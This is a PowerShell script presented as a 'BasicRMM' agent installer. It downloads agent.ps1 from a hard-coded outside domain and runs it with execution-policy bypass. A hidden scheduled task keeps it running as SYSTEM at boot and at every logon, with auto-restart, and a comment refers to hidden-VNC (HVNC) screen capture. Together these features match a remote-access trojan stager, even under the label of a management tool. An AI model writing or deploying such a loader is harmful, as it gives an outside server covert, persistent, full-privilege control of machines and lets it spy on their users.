# BasicRMM Agent Installer — no Python, no pip, no dependencies
param(
    [string]$ServerUrl   = "https://3729-ndax.com",
    [string]$EnrollToken = "",
    [string]$AgentUrl    = ""
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

# ── Require Administrator ────────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "ERROR: Run as Administrator." -ForegroundColor Red; exit 1 }

$Server     = if ($ServerUrl)   { $ServerUrl }   else { "https://3729-ndax.com" }
$Token      = if ($EnrollToken) { $EnrollToken } else { "" }
$InstallDir = "$env:ProgramFiles\BasicRMM\Agent"
$TaskName   = "BasicRMMAgent"

Write-Host ""
Write-Host "  BasicRMM Agent Installer" -ForegroundColor Cyan
Write-Host "  Server: $Server"          -ForegroundColor Gray
Write-Host ""

# ── [1/3] Download agent ─────────────────────────────────────────────────────
Write-Host "[1/3] Downloading agent..." -ForegroundColor Cyan
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
Invoke-WebRequest -UseBasicParsing -Uri "$Server/agent/agent.ps1" -OutFile "$InstallDir\agent.ps1"
Write-Host "  OK" -ForegroundColor Green

# ── [2/3] Write launch script with credentials baked in ──────────────────────
Write-Host "[2/3] Writing configuration..." -ForegroundColor Cyan
@"
`$env:RMM_SERVER      = '$Server'
`$env:RMM_AGENT_TOKEN = '$Token'
Set-Location '$InstallDir'
& powershell.exe -NonInteractive -ExecutionPolicy Bypass -File '$InstallDir\agent.ps1' -Server '$Server' -Token '$Token'
"@ | Set-Content "$InstallDir\launch.ps1" -Encoding UTF8
Write-Host "  OK" -ForegroundColor Green

# ── [3/3] Register Scheduled Task (SYSTEM, runs at boot, auto-restarts) ──────
Write-Host "[3/3] Registering startup task..." -ForegroundColor Cyan

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$action   = New-ScheduledTaskAction `
               -Execute  "powershell.exe" `
               -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallDir\launch.ps1`""

# Two triggers: at startup AND when any user logs on (covers both cases)
$triggers = @(
    New-ScheduledTaskTrigger -AtStartup,
    New-ScheduledTaskTrigger -AtLogOn
)

$settings = New-ScheduledTaskSettingsSet `
               -ExecutionTimeLimit 0 `
               -RestartCount 10 `
               -RestartInterval (New-TimeSpan -Minutes 1) `
               -StartWhenAvailable `
               -MultipleInstances IgnoreNew

# Run as SYSTEM with highest privileges — works headless for heartbeat/commands
# Screen capture (HVNC) works when a user session exists
$principal = New-ScheduledTaskPrincipal `
               -UserId    "SYSTEM" `
               -LogonType ServiceAccount `
               -RunLevel  Highest

Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $triggers `
    -Settings $settings -Principal $principal -Force | Out-Null

# Start it right now without waiting for reboot
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 5

$state = (Get-ScheduledTask -TaskName $TaskName).State
$lastRun = (Get-ScheduledTaskInfo -TaskName $TaskName).LastRunTime

Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  INSTALLED!  Task: $state  Last run: $lastRun" -ForegroundColor Green
Write-Host "  Device appears in dashboard in ~30s."   -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Cyan
